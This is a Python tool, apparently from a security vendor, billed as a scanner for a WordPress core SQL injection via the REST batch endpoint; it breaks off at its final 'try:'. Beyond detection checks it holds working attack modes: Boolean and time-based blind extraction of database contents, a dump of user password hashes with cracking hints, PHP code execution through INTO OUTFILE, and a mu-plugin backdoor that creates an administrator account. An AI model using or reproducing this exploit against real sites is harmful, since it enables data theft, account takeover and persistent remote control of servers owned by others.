#!/usr/bin/env python3
# coding=utf-8
# ******************************************************************
# wp2shell-scan: A scanner for WordPress Core RCE CVE-2026-63030
# (wp2shell) — pre-authenticated SQL injection via the REST API
# batch endpoint, chained to file-write and code execution.
# Author:
# Mazin Ahmed <Mazin at FullHunt.io>
# Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.
# Secure your Attack Surface with FullHunt.io.
#
# Only run against systems you own or have written permission to test.
# ******************************************************************

import argparse
import difflib
import json
import secrets
import sys
import time
from urllib.parse import quote, urlsplit, urlunsplit

import requests
import urllib3

try:
    from termcolor import cprint
except ImportError:  # fall back to plain output if termcolor is unavailable
    def cprint(text, color=None):
        print(text)


cprint("[•] CVE-2026-63030 - WordPress Core wp2shell RCE Scanner", "green")
cprint("[•] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.", "yellow")
cprint("[•] Secure your External Attack Surface with FullHunt.io.", "yellow")

if len(sys.argv) <= 1:
    print("\n%s -h for help." % (sys.argv[0]))
    exit(0)


USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/150.0.0.0 Safari/537.36"
)
DEFAULT_PHP_CODE = "<?php phpinfo(); ?>"
DEFAULT_WEBROOT = "/var/www/html"
DEFAULT_SLEEP = 5
DEFAULT_ENDPOINT = "/wp/v2/categories"

# Boolean / error-based payloads. The injection lands inside
# `post_author NOT IN (<payload>)` in WP_Query.
SQL_VALID = "0) AND 1=1-- -"        # posts returned (TRUE)
SQL_FALSE = "0) AND 1=0-- -"        # empty result (FALSE)
SQL_BROKEN = "0) AND 'x"            # SQL syntax error

PROBE_ENDPOINTS = [
    "/wp/v2/posts",
    "/wp/v2/pages",
    "/wp/v2/categories",
    "/wp/v2/tags",
    "/wp/v2/comments",
    "/wp/v2/media",
    "/wp/v2/users",
    "/wp/v2/blocks",
    "/wp/v2/templates",
    "/wp/v2/template-parts",
    "/wp/v2/settings",
    "/wp/v2/block-types",
    "/wp/v2/block-patterns/patterns",
]

PREBUILT_QUERIES = {
    "user":             "SELECT USER()",
    "database":         "SELECT DATABASE()",
    "version":          "SELECT VERSION()",
    "current_user":     "SELECT CURRENT_USER()",
    "hostname":         "SELECT @@hostname",
    "datadir":          "SELECT @@datadir",
    "basedir":          "SELECT @@basedir",
    "tables": ("SELECT GROUP_CONCAT(table_name) FROM information_schema.tables "
               "WHERE table_schema=DATABASE()"),
    "columns:wp_users": ("SELECT GROUP_CONCAT(column_name) FROM information_schema.columns "
                         "WHERE table_schema=DATABASE() AND table_name='wp_users'"),
    "columns:wp_options": ("SELECT GROUP_CONCAT(column_name) FROM information_schema.columns "
                           "WHERE table_schema=DATABASE() AND table_name='wp_options'"),
    "users": ("SELECT GROUP_CONCAT(user_login,0x3a,user_pass,0x3a,user_email) "
              "FROM wp_users"),
    "options": ("SELECT GROUP_CONCAT(option_name,0x3a,option_value SEPARATOR '<br>') "
                "FROM wp_options WHERE autoload='yes' LIMIT 20"),
    "siteurl": "SELECT option_value FROM wp_options WHERE option_name='siteurl'",
    "home":    "SELECT option_value FROM wp_options WHERE option_name='home'",
    "table_prefix": ("SELECT SUBSTRING(TABLE_NAME,1,LENGTH(TABLE_NAME)-7) "
                     "FROM information_schema.tables WHERE table_schema=DATABASE() "
                     "AND table_name LIKE '%options' LIMIT 1"),
    "wp_users_count": "SELECT COUNT(*) FROM wp_users",
}

MODES_SAFE = ("check", "probe-endpoints", "probe")
MODES_AUTH = ("exploit", "adduser", "get-users", "extract", "blind")

parser = argparse.ArgumentParser(
    description="CVE-2026-63030 (wp2shell) scanner: time-based / error-based checks, "
                "Boolean and blind extraction, authorized exploit validation.",
    formatter_class=argparse.RawDescriptionHelpFormatter,
    epilog="""
Examples:
  # non-destructive time-based (SLEEP) check on a single URL
  %(prog)s check -u https://wp.example.com --check-type time-based

  # non-destructive error-based check (TRUE/FALSE/broken differential)
  %(prog)s check -u https://wp.example.com --check-type error-based

  # scan a list of URLs
  %(prog)s check -l urls.txt

  # find which REST endpoints pass the injection through to WP_Query
  %(prog)s probe-endpoints -u https://wp.example.com

  # diff SQL payloads side-by-side
  %(prog)s probe -u https://wp.example.com \\
      --sql "valid:0) AND 1=1-- -" \\
      --sql "false:0) AND 1=0-- -" \\
      --sql "broken:0) AND 'x"

  # extract DB metadata via the Boolean oracle (fast, no timing)
  %(prog)s extract -u https://wp.example.com \\
      --i-have-authorization --dump user,database,tables,users

  # slow but reliable timing-based blind extraction
  %(prog)s blind -u https://wp.example.com --i-have-authorization --sleep 3 \\
      --query "SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()"

  # validate the full SQLi -> file-write -> code-execution chain
  %(prog)s exploit -u https://wp.example.com --i-have-authorization
""",
)
parser.add_argument("mode",
                    choices=["check", "probe-endpoints", "probe", "extract", "blind",
                             "exploit", "adduser", "get-users"],
                    help="Scan mode.")
parser.add_argument("-u", "--url",
                    dest="url",
                    help="Check a single URL.",
                    action="store")
parser.add_argument("-l", "--list",
                    dest="usedlist",
                    help="Check a list of URLs.",
                    action="store")
parser.add_argument("-p", "--proxy",
                    dest="proxy",
                    help="Send requests through proxy.",
                    action="store")
parser.add_argument("--check-type",
                    dest="check_type",
                    choices=["time-based", "error-based"],
                    default="time-based",
                    help="Detection method for check mode - [Default: time-based].")
parser.add_argument("-k", "--insecure",
                    dest="insecure",
                    help="Disable TLS certificate verification.",
                    action="store_true")
parser.add_argument("--timeout",
                    dest="timeout",
                    type=float, default=15,
                    help="HTTP timeout (in seconds) - [Default: 15].")
parser.add_argument("--sleep",
                    dest="sleep",
                    type=int, default=DEFAULT_SLEEP,
                    help=f"SLEEP seconds for time-based checks and blind mode - [Default: {DEFAULT_SLEEP}].")
parser.add_argument("--endpoint",
                    dest="endpoint",
                    default=DEFAULT_ENDPOINT,
                    help=f"REST endpoint used for the injection - [Default: {DEFAULT_ENDPOINT}].")
parser.add_argument("--webroot",
                    dest="webroot",
                    action="append", metavar="PATH[,PATH...]",
                    help=f"Server webroot for OUTFILE writes; repeatable - [Default: {DEFAULT_WEBROOT}].")
parser.add_argument("--out-name",
                    dest="out_name",
                    help="Dropped filename - [Default: random].")
parser.add_argument("--php-code",
                    dest="php_code",
                    default=DEFAULT_PHP_CODE,
                    help="PHP written as the OUTFILE row terminator - [Default: %(default)r].")
parser.add_argument("--user-login",
                    dest="user_login",
                    default="wpadmin",
                    help="Backdoor username for adduser mode - [Default: wpadmin].")
parser.add_argument("--user-pass",
                    dest="user_pass",
                    default="P@ssw0rd123!",
                    help="Backdoor password for adduser mode.")
parser.add_argument("--user-email",
                    dest="user_email",
                    default="wpadmin@local",
                    help="Backdoor email for adduser mode.")
parser.add_argument("--i-have-authorization",
                    dest="i_have_authorization",
                    help="Required for exploit, adduser, get-users, extract, and blind modes.",
                    action="store_true")
parser.add_argument("--sql",
                    dest="sql_payloads",
                    metavar="LABEL:SQL",
                    action="append",
                    help="probe mode: repeatable label:sql payload pair.")
parser.add_argument("--query",
                    dest="query",
                    help="extract/blind mode: custom SQL scalar query to extract.")
parser.add_argument("--dump",
                    dest="dump",
                    nargs="*", metavar="KEY",
                    help="extract mode: prebuilt query keys (comma or space separated); "
                    "empty=user+db+version. Available: " + ", ".join(sorted(PREBUILT_QUERIES)))
parser.add_argument("--all",
                    dest="dump_all",
                    help="extract mode: dump all prebuilt queries.",
                    action="store_true")
parser.add_argument("-v", "--verbose",
                    dest="verbose",
                    action="store_true")

args = parser.parse_args()


if not args.url and not args.usedlist:
    parser.error("one of -u/--url or -l/--list is required.")

if args.mode in MODES_AUTH and not args.i_have_authorization:
    parser.error(f"{args.mode} mode requires --i-have-authorization.")

if args.mode in ("exploit", "adduser") and "'" in args.php_code:
    parser.error("--php-code must not contain single quotes.")

if args.sql_payloads:
    parsed_payloads = []
    for item in args.sql_payloads:
        if ":" in item:
            parsed_payloads.append(item.split(":", 1))
        else:
            parsed_payloads.append((f"payload-{len(parsed_payloads)}", item))
    args.sql_payloads = parsed_payloads

if args.dump:
    flat = []
    for token in args.dump:
        flat.extend(k.strip() for k in token.split(",") if k.strip())
    args.dump = flat
if args.dump == ["all"]:
    args.dump_all = True
if args.dump_all:
    args.dump = list(PREBUILT_QUERIES.keys())

webroots = []
for entry in args.webroot or [DEFAULT_WEBROOT]:
    webroots.extend(p.strip() for p in entry.split(",") if p.strip())
args.webroot = webroots

proxies = {}
if args.proxy:
    proxies = {"http": args.proxy, "https": args.proxy}

if args.insecure:
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ---------------------------------------------------------------------------
# Request builders
# ---------------------------------------------------------------------------

def normalize_target(target: str) -> str:
    if "://" not in target:
        target = f"https://{target}"
    parsed = urlsplit(target)
    if parsed.scheme not in {"http", "https"} or not parsed.netloc:
        raise ValueError(f"invalid target URL: {target!r}")
    path = parsed.path.rstrip("/") + "/"
    return urlunsplit((parsed.scheme, parsed.netloc, path, "", ""))


def batch_urls(base: str) -> list[str]:
    return [f"{base}?rest_route=/batch/v1", f"{base}wp-json/batch/v1"]


def build_session() -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "User-Agent": USER_AGENT,
        "Accept": "application/json, text/html;q=0.9, */*;q=0.8",
    })
    s.proxies = proxies
    return s


def build_batch_body(injection_path: str) -> dict:
    """Nested batch structure confirmed working against WP 7.0.1.

    outer[0] POST http://:   → parse_path_failed (shifts $matches)
    outer[1] POST /wp/v2/posts ← body.requests triggers re-entrant batch
      inner[0] GET http://:  → parse_path_failed (inner shift)
      inner[1] GET /wp/v2/categories?author_exclude=<SQL>  ← injection lands here
      inner[2] GET /wp/v2/posts  ← gets wrong handler due to shift (ignored)
    outer[2] POST /batch/v1  ← triggers Bug 2 re-entrancy
    """
    return {
        "requests": [
            {"method": "POST", "path": "http://:"},
            {
                "method": "POST",
                "path": "/wp/v2/posts",
                "body": {
                    "requests": [
                        {"method": "GET", "path": "http://:"},
                        {"method": "GET", "path": injection_path},
                        {"method": "GET", "path": "/wp/v2/posts"},
                    ]
                },
            },
            {"method": "POST", "path": "/batch/v1"},
        ]
    }


def injection_path(endpoint: str, payload: str) -> str:
    return f"{endpoint}?author_exclude={quote(payload, safe='')}"


def timing_injection(endpoint: str, condition: bool, sleep_s: int) -> str:
    comparison = "1=1" if condition else "1=0"
    sqli = f"SELECT IF(({comparison}),SLEEP({sleep_s}),0)"
    return injection_path(endpoint, sqli)


def outfile_injection(endpoint: str, outfile: str, php_code: str) -> str:
    # NOTE: The -- comment only covers a single line. WP 7.0.1 builds its
    # SQL as a multi-line PHP string. On PHP installs using the mysqlnd
    # driver (the default since PHP 5.4+), unclosed /* block comments are
    # rejected as syntax errors. This means the OUTFILE write works reliably
    # only when:
    #   * the PHP MySQL driver is libmysqlclient (older stacks), OR
    #   * the WordPress version predates the multi-line SQL change
    # The Boolean oracle (extract mode) is the reliable extraction path for
    # stock WP 7.0.1+mysqlnd.
    sqli = (
        f"0) OR 1=1 LIMIT 1 INTO OUTFILE '{outfile}' "
        f"LINES TERMINATED BY '{php_code}'-- -"
    )
    return injection_path(endpoint, sqli)


# ---------------------------------------------------------------------------
# HTTP helpers
# ---------------------------------------------------------------------------

def post_batch(session, base, body, verify, timeout):
    result = (None, 0.0, "")
    for url in batch_urls(base):
        try:
            started = time.monotonic()
            resp = session.post(url, json=body, timeout=timeout, verify=verify)
            elapsed = time.monotonic() - started
            result = (resp, elapsed, url)
            if resp.status_code not in (404, 403):
                break
        except requests.RequestException:
            continue
    return result


def detect_wordpress(session, base, verify, timeout) -> bool:
    try:
        probe = session.get(base, timeout=timeout, verify=verify)
        headers = "\n".join(f"{k}: {v}" for k, v in probe.headers.items())
        return (
            "wp-content" in probe.text
            or "wp-includes" in probe.text
            or "rest_route" in headers.lower()
        )
    except requests.RequestException:
        return False


def get_inner_response(resp):
    """Navigate nested batch JSON to inner[1] (the injection response)."""
    try:
        data = resp.json()
        return data["responses"][1]["body"]["responses"][1]
    except (KeyError, IndexError, TypeError, json.JSONDecodeError):
        return None


def get_inner_total(resp) -> int:
    """Return X-WP-Total from inner[1] of the nested batch response, or -1."""
    try:
        data = resp.json()
        inner = data["responses"][1]["body"]["responses"][1]
        return int(inner.get("headers", {}).get("X-WP-Total", 0))
    except Exception:
        return -1


def flatten_response_text(resp) -> str:
    try:
        return json.dumps(resp.json(), indent=2, sort_keys=True)
    except Exception:
        return resp.text


# ---------------------------------------------------------------------------
# check mode — time-based (SLEEP) and error-based (TRUE/FALSE/broken diff)
# ---------------------------------------------------------------------------

def check_time_based(session, base, args) -> bool:
    verify = not args.insecure
    print(f"[*] {base} -- time-based (SLEEP) check")
    try:
        session.get(base, timeout=args.timeout, verify=verify)
    except requests.RequestException:
        print("    [-] target unreachable (connection failed)")
        return False
    if not detect_wordpress(session, base, verify, args.timeout):
        print("    [-] WordPress not detected (target responded but doesn't appear to be WordPress)")
        return False

    body_false = build_batch_body(timing_injection(args.endpoint, False, args.sleep))
    resp, elapsed, url = post_batch(session, base, body_false, verify,
                                    args.timeout + args.sleep + 10)
    if resp is None:
        print("    [-] HTTP request failed — target unreachable")
        return False
    print(f"    [*] FALSE: {resp.status_code} in {elapsed:.2f}s ({url})")
    inner = get_inner_response(resp)
    if inner is None or inner.get("status") != 200 or elapsed >= args.sleep:
        print("    [-] Baseline failed — batch endpoint absent, blocked, or patched")
        return False

    body_true = build_batch_body(timing_injection(args.endpoint, True, args.sleep))
    resp, elapsed, _ = post_batch(session, base, body_true, verify,
                                  args.timeout + args.sleep + 10)
    if resp is None:
        print("    [-] HTTP request failed — target unreachable")
        return False
    inner = get_inner_response(resp)
    vuln = inner is not None and inner.get("status") == 200 and elapsed >= args.sleep
    print(f"    [*] TRUE:  {resp.status_code} in {elapsed:.2f}s")
    print(f"    {'[+] VULNERABLE' if vuln else '[-] not vulnerable'}")
    return vuln


def check_error_based(session, base, args) -> bool:
    """Non-destructive differential check: a TRUE condition must return rows,
    a FALSE condition must return none, and broken SQL must behave differently
    (the query fails at the database layer). Proves the payload reaches
    WP_Query without relying on SLEEP timing."""
    verify = not args.insecure
    print(f"[*] {base} -- error-based (differential) check")
    try:
        session.get(base, timeout=args.timeout, verify=verify)
    except requests.RequestException:
        print("    [-] target unreachable (connection failed)")
        return False
    if not detect_wordpress(session, base, verify, args.timeout):
        print("    [-] WordPress not detected (target responded but doesn't appear to be WordPress)")
        return False

    totals = {}
    for label, sqli in (("TRUE", SQL_VALID), ("FALSE", SQL_FALSE), ("BROKEN", SQL_BROKEN)):
        body = build_batch_body(injection_path(args.endpoint, sqli))
        resp, elapsed, _ = post_batch(session, base, body, verify, args.timeout)
        if resp is None:
            print(f"    [*] {label:<7} HTTP request failed — target unreachable")
            return False
        total = get_inner_total(resp)
        totals[label] = total
        print(f"    [*] {label:<7} HTTP {resp.status_code}  {elapsed:.2f}s  X-WP-Total={total}")

    if totals["TRUE"] == -1:
        print("    [-] Baseline failed — batch endpoint absent, blocked, or patched")
        return False

    vuln = totals["TRUE"] > 0 and totals["FALSE"] == 0
    if vuln:
        evidence = ("broken payload produced an SQL error (empty result)"
                    if totals["BROKEN"] == 0 else
                    "broken payload behaved unexpectedly — verify manually")
        print(f"    [+] VULNERABLE (error-based differential confirmed; {evidence})")
    else:
        print("    [-] not vulnerable")
    return vuln


def check_target(session, base, args) -> bool:
    if args.check_type == "error-based":
        return check_error_based(session, base, args)
    return check_time_based(session, base, args)


# ---------------------------------------------------------------------------
# probe-endpoints mode — find working injection endpoints
# ---------------------------------------------------------------------------

def probe_endpoints_target(session, base, args) -> list[str]:
    """Test each endpoint with AND 1=1; return list of working ones."""
    verify = not args.insecure
    working = []
    print(f"[*] {base} — probing {len(PROBE_ENDPOINTS)} endpoints...")
    first_ok = True

    for ep in PROBE_ENDPOINTS:
        sqli = "0) AND 1=1-- -"
        body = build_batch_body(injection_path(ep, sqli))
        resp, elapsed, url = post_batch(session, base, body, verify, args.timeout)
        if resp is None:
            print(f"    {ep:<40} ERR: request failed")
            continue

        ct = resp.headers.get("Content-Type", "")
        total = -1
        raw = False
        try:
            data = resp.json()
            outer1 = data.get("responses", [{}])[1] if len(data.get("responses", [])) > 1 else {}
            body_val = outer1.get("body", {})
            inner_list = body_val.get("responses", []) if isinstance(body_val, dict) else []
            inner = inner_list[1] if len(inner_list) > 1 else {}
            total = int(inner.get("headers", {}).get("X-WP-Total", -1))
        except Exception:
            raw = True

        if total > 0:
            tag = f"[+] WORKS (total={total})"
            working.append(ep)
        elif raw:
            tag = f"[!] HTML/error (ct={ct[:30]})"
            if first_ok:
                print(f"    [*] raw response sample: {resp.text[:120]}")
                first_ok = False
        else:
            tag = f"[-] blocked (HTTP {resp.status_code})"
        print(f"    {ep:<40} HTTP {resp.status_code} {elapsed:.2f}s  {tag}")

    print(f"\n    [*] Working endpoints: {len(working)}")
    for ep in working:
        print(f"        --endpoint {ep}")
    return working


# ---------------------------------------------------------------------------
# probe mode — diff N payloads side-by-side
# ---------------------------------------------------------------------------

def probe_target(session, base, args) -> str:
    print(f"[*] {base} -- payload diff probe")
    verify = not args.insecure

    payloads = args.sql_payloads or [
        ("valid", SQL_VALID),
        ("broken", SQL_BROKEN),
        ("false", SQL_FALSE),
    ]
    bodies = []
    for label, sql in payloads:
        path = injection_path(args.endpoint, sql)
        body = build_batch_body(path)
        resp, elapsed, url = post_batch(session, base, body, verify, args.timeout)
        if resp is None:
            print(f"    [{label:>12}] ERR: request failed")
            continue
        total = get_inner_total(resp)
        bodies.append((label, flatten_response_text(resp)))
        print(f"    [{label:>12}] HTTP {resp.status_code}  "
              f"{elapsed:.2f}s  X-WP-Total={total}")

    for i in range(len(bodies) - 1):
        a_label, a_text = bodies[i]
        b_label, b_text = bodies[i + 1]
        diff = difflib.unified_diff(
            a_text.splitlines(keepends=True),
            b_text.splitlines(keepends=True),
            fromfile=a_label, tofile=b_label, lineterm="",
        )
        diff_str = "".join(diff)
        if diff_str.strip():
            print(f"\n    -- diff {a_label} -> {b_label} --")
            for line in diff_str.rstrip().split("\n"):
                print(f"    {line}")
        else:
            print(f"    (no diff between {a_label} and {b_label})")
    return "done"


# ---------------------------------------------------------------------------
# Boolean oracle (content-based; X-WP-Total header is the TRUE/FALSE signal)
# ---------------------------------------------------------------------------

def oracle(session, base, endpoint, condition_sql, verify, timeout) -> bool:
    sql = f"0) AND ({condition_sql})-- -"
    path = injection_path(endpoint, sql)
    body = build_batch_body(path)
    resp, _, _ = post_batch(session, base, body, verify, timeout)
    return get_inner_total(resp) > 0


def oracle_len(session, base, endpoint, query, verify, timeout) -> int:
    if not oracle(session, base, endpoint, f"LENGTH(({query}))>0", verify, timeout):
        return 0
    lo, hi = 1, 4096
    while lo <= hi:
        mid = (lo + hi) // 2
        if oracle(session, base, endpoint, f"LENGTH(({query}))>{mid}", verify, timeout):
            lo = mid + 1
        else:
            hi = mid - 1
    return lo


def oracle_extract(session, base, endpoint, query, verify, timeout) -> str:
    """Extract a scalar query result via Boolean oracle, binary search per char."""
    length = oracle_len(session, base, endpoint, query, verify, timeout)
    if length <= 0:
        return ""
    result = ""
    for i in range(1, length + 1):
        lo, hi = 32, 126
        while lo <= hi:
            mid = (lo + hi) // 2
            cond = f"ASCII(SUBSTRING(({query}),{i},1))>{mid}"
            if oracle(session, base, endpoint, cond, verify, timeout):
                lo = mid + 1
            else:
                hi = mid - 1
        result += chr(lo) if 32 <= lo <= 126 else "?"
        sys.stdout.write(f"\r    [*] extracting [{i}/{length}] {result}")
        sys.stdout.flush()
    sys.stdout.write("\n")
    return result


def extract_target(session, base, args) -> str:
    print(f"[*] {base} -- Boolean oracle extraction")
    verify = not args.insecure

    if args.query:
        queries = {"custom": args.query}
    else:
        wanted = args.dump or ["user", "database", "version"]
        queries = {k: PREBUILT_QUERIES[k] for k in wanted if k in PREBUILT_QUERIES}

    extracted_any = False
    for label, query in queries.items():
        print(f"\n-- {label} --")
        print(f"    SQL: {query}")
        if not oracle(session, base, args.endpoint, "1=1", verify, args.timeout):
            print("    [-] Boolean oracle not responding — site likely patched")
            return "failed"
        value = oracle_extract(session, base, args.endpoint, query, verify, args.timeout)
        print(f"    {value}" if value else "    (empty)")
        extracted_any = extracted_any or bool(value)
    return "extracted" if extracted_any else "done"


# ---------------------------------------------------------------------------
# blind mode — SLEEP-based timing extraction (slower, fallback)
# ---------------------------------------------------------------------------

def timing_oracle(session, base, endpoint, condition_sql, sleep_s, verify, timeout) -> bool:
    sql = f"0) AND ({condition_sql}) AND SLEEP({sleep_s})-- -"
    path = injection_path(endpoint, sql)
    body = build_batch_body(path)
    started = time.monotonic()
    post_batch(session, base, body, verify, timeout + sleep_s + 5)
    elapsed = time.monotonic() - started
    return elapsed >= sleep_s


def timing_len(session, base, endpoint, query, sleep_s, verify, timeout) -> int:
    if not timing_oracle(session, base, endpoint, f"LENGTH(({query}))>0",
                         sleep_s, verify, timeout):
        return 0
    lo, hi = 1, 4096
    while lo <= hi:
        mid = (lo + hi) // 2
        cond = f"LENGTH(({query}))>{mid}"
        if timing_oracle(session, base, endpoint, cond, sleep_s, verify, timeout):
            lo = mid + 1
        else:
            hi = mid - 1
    return lo


def timing_extract(session, base, endpoint, query, sleep_s, verify, timeout) -> str:
    length = timing_len(session, base, endpoint, query, sleep_s, verify, timeout)
    print(f"    [*] result length: {length}")
    if length <= 0:
        return ""
    result = ""
    for i in range(1, length + 1):
        lo, hi = 32, 126
        while lo <= hi:
            mid = (lo + hi) // 2
            cond = f"ASCII(SUBSTRING(({query}),{i},1))>{mid}"
            if timing_oracle(session, base, endpoint, cond, sleep_s, verify, timeout):
                lo = mid + 1
            else:
                hi = mid - 1
        result += chr(lo) if 32 <= lo <= 126 else "?"
        sys.stdout.write(f"\r    [*] extracting [{i}/{length}] {result}")
        sys.stdout.flush()
    sys.stdout.write("\n")
    return result


def blind_target(session, base, args) -> str:
    print(f"[*] {base} -- timing-based blind extraction")
    verify = not args.insecure
    if not args.query:
        print("    [-] --query required for blind mode")
        return "failed"
    data = timing_extract(session, base, args.endpoint, args.query,
                          args.sleep, verify, args.timeout)
    print(f"    [+] {data}")
    return "extracted" if data else "failed"


# ---------------------------------------------------------------------------
# exploit mode — SQLi -> INTO OUTFILE -> PHP execution
# ---------------------------------------------------------------------------

def print_cleanup(outfile: str) -> None:
    print(
        f"    [!] CLEANUP: rm {outfile}  "
        "(INTO OUTFILE cannot overwrite; remove out-of-band)"
    )


def exploit_target(session, base, args) -> str:
    verify = not args.insecure
    name = args.out_name or f"wp2shell-phpinfo-{secrets.token_hex(4)}.php"
    file_url = f"{base}{name}"
    print(f"[*] {base} -- exploit (file: {name})")

    for webroot in args.webroot:
        outfile = f"{webroot.rstrip('/')}/{name}"
        print(f"    [*] trying OUTFILE path: {outfile}")
        body = build_batch_body(outfile_injection(args.endpoint, outfile, args.php_code))
        resp, elapsed, url = post_batch(session, base, body, verify, args.timeout)
        if resp is None:
            print(f"    [*] OUTFILE {outfile} — request failed")
            continue
        print(f"    [*] batch response: {resp.status_code}, {elapsed:.2f}s")

        time.sleep(0.5)
        try:
            fetched = session.get(file_url, timeout=args.timeout, verify=verify)
        except requests.RequestException as exc:
            print(f"    [!] verification fetch failed: {exc}")
            continue

        if fetched.status_code != 200:
            print(f"    [-] {file_url} -> HTTP {fetched.status_code}")
            continue

        text = fetched.text
        if "<?php" in text:
            print(
                f"    [~] FILE WRITTEN but PHP DID NOT EXECUTE: {file_url}\n"
                "        (raw source served; SQLi->file-write confirmed, execution not)"
            )
            print_cleanup(outfile)
            return "written"
        if "phpinfo()" in text or "php version" in text.lower():
            print(f"    [+] VERIFIED: PHP executed at {file_url}")
            print("        Full SQLi->file-write->code-execution chain confirmed.")
            print_cleanup(outfile)
            return "verified"
        print(f"    [~] {file_url} returned 200 but no phpinfo markers; inspect manually")
        print_cleanup(outfile)
        return "written"

    print(
        "    [-] Exploit not confirmed. Likely causes:\n"
        "        * site patched (6.9.5+ / 7.0.2+)\n"
        "        * MySQL FILE privilege missing or secure_file_priv blocks write\n"
        "        * webroot path differs — retry with --webroot\n"
        "        * WAF blocking /batch/v1"
    )
    return "failed"


# ---------------------------------------------------------------------------
# adduser mode — OUTFILE backdoor admin, Boolean extraction fallback
# ---------------------------------------------------------------------------

def adduser_payload(username: str, password: str, email: str) -> str:
    """Build PHP code (zero single-quotes) that inserts an administrator."""
    php = (
        '<?php '
        '@include_once(dirname(__FILE__)."/../wp-load.php");'
        'if(!username_exists("' + username + '")){'
        'wp_insert_user(array('
        '"user_login"=>"' + username + '",'
        '"user_pass"=>"' + password + '",'
        '"user_email"=>"' + email + '",'
        '"role"=>"administrator"));'
        '}'
        'echo "OK:user-created";'
        '?>'
    )
    return php


def adduser_target(session, base, args) -> str:
    """Write a PHP backdoor via INTO OUTFILE; fall back to Boolean
    oracle extraction of the admin password hash on failure."""
    verify = not args.insecure
    name = f"wp-{secrets.token_hex(3)}.php"
    php = adduser_payload(args.user_login, args.user_pass, args.user_email)
    timeout = args.timeout
    print(f"[*] {base} -- adduser (user: {args.user_login})")

    # ---- path A: INTO OUTFILE write a PHP backdoor ----
    for webroot in args.webroot:
        for subdir in ("/wp-content/mu-plugins/", "/wp-content/plugins/"):
            outfile = webroot.rstrip("/") + subdir + name
            print(f"    [*] OUTFILE -> {outfile}")
            sqli = (
                f"0) OR 1=1 LIMIT 1 INTO OUTFILE '{outfile}' "
                f"LINES TERMINATED BY '{php}'-- -"
            )
            body = build_batch_body(injection_path(args.endpoint, sqli))
            resp, elapsed, _ = post_batch(session, base, body, verify, timeout)
            if resp is None:
                print(f"    [*] OUTFILE {outfile} — request failed")
                continue
            print(f"    [*] HTTP {resp.status_code}  {elapsed:.2f}s")

            trigger_url = base + f"wp-content/{subdir.split('/')[-2]}/{name}"
            time.sleep(0.5)
            try:
                trig = session.get(trigger_url, timeout=timeout, verify=verify)
            except requests.RequestException:
                continue

            if trig.status_code == 200 and "OK:user-created" in trig.text:
                print(f"    [+] BACKDOOR CREATED: {args.user_login}")
                print(f"    [+] Login: {base}wp-admin/  ({args.user_login} : {args.user_pass})")
                print(f"    [!] rm {outfile}")
                return "added"

    # ---- path B: Boolean oracle — extract admin hash ----
    print("\n    [*] OUTFILE path not available — extracting admin hash instead...")
    query = ("SELECT GROUP_CONCAT(user_login,0x3a,user_pass,0x3a,user_email) "
             "FROM wp_users LIMIT 1")
    try:
        data = oracle_extract(session, base, args.endpoint, query, verify, timeout)
    except Exception as exc:
        print(f"    [-] extraction failed: {exc}")
        return "failed"

    if ":" not in data:
        print(f"    [-] unexpected output: {data}")
        return "failed"

    parts = data.split(":")
    username, hashval = parts[0], parts[1] if len(parts) > 1 else "?"
    email = parts[2] if len(parts) > 2 else "?"
    print("\n    [+] ADMIN HASH EXTRACTED:")
    print(f"        User:  {username}")
    print(f"        Hash:  {hashval}")
    print(f"        Email: {email}")
    print("    [*] Reuse this hash to authenticate:")
    print(f"        hashcat -m 3200 {hashval}.txt wordlist.txt  # bcrypt/WordPress")
    print("    [*] Or pass-the-hash with a crafted WordPress auth cookie.")
    return "hash-extracted"


# ---------------------------------------------------------------------------
# get-users mode — Boolean oracle dump of all wp_users rows
# ---------------------------------------------------------------------------

def getusers_target(session, base, args) -> str:
    verify = not args.insecure
    print(f"[*] {base} -- extracting wp_users credentials...")
    query = (
        "SELECT GROUP_CONCAT(user_login,0x3a,user_pass,0x3a,"
        "user_email,0x3a,user_registered SEPARATOR 0x0a) FROM wp_users"
    )
    try:
        data = oracle_extract(session, base, args.endpoint, query, verify, args.timeout)
    except Exception as exc:
        print(f"    [-] extraction failed: {exc}")
        return "failed"

    if not data:
        print("    [-] no users returned")
        return "failed"

    print("\n    [+] WP_USERS DUMP:")
    print(f"    {'-' * 60}")
    for line in data.split("\n"):
        parts = line.strip().split(":", 3)
        if len(parts) >= 3:
            user, hashval, email = parts[0], parts[1], parts[2]
            registered = parts[3] if len(parts) > 3 else "?"
            print(f"    User:       {user}")
            print(f"    Hash:       {hashval}")
            print(f"    Email:      {email}")
            print(f"    Registered: {registered}")
            print(f"    {'-' * 60}")
    print("\n    [*] hashcat -m 3200 hash.txt wordlist.txt   # bcrypt/WordPress")
    print("    [*] Or pass-the-hash with a crafted WordPress auth cookie.")
    return "extracted"


# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------

def main():
    urls = []
    if args.url:
        urls.append(args.url)
    if args.usedlist:
        with open(args.usedlist, "r") as f:
            for line in f.readlines():
                line = line.strip()
                if line == "" or line.startswith("#"):
                    continue
                urls.append(line)

    session = build_session()
    results = {}
    for raw in urls:
        try:
            base = normalize_target(raw)
        except ValueError as exc:
            print(f"[!] {exc}", file=sys.stderr)
            results[raw] = "error"
            continue
        try:
            if args.mode == "check":
                results[base] = "vulnerable" if check_target(session, base, args) else "not vulnerable"
            elif args.mode == "probe-endpoints":
                working = probe_endpoints_target(session, base, args)
                results[base] = f"{len(working)} working" if working else "none"
            elif args.mode == "probe":
                results[base] = probe_target(session, base, args)
            elif args.mode == "extract":
                results[base] = extract_target(session, base, args)
            elif args.mode == "blind":
                results[base] = blind_target(session, base, args)
            elif args.mode == "adduser":
                results[base] = adduser_target(session, base, args)
            elif args.mode == "get-users":
                results[base] = getusers_target(session, base, args)
            else:
                results[base] = exploit_target(session, base, args)
        except requests.RequestException as exc:
            print(f"    [!] {exc}", file=sys.stderr)
            results[base] = "error"

    if len(results) > 1:
        print("\n=== Summary ===")
        for t, r in results.items():
            print(f"  {t:<45} {r}")

    positives = {"vulnerable", "verified", "written", "added", "hash-extracted", "extracted"}
    return 0 if any(r in positives for r in results.values()) else 1


if __name__ == "__main__":
    try:
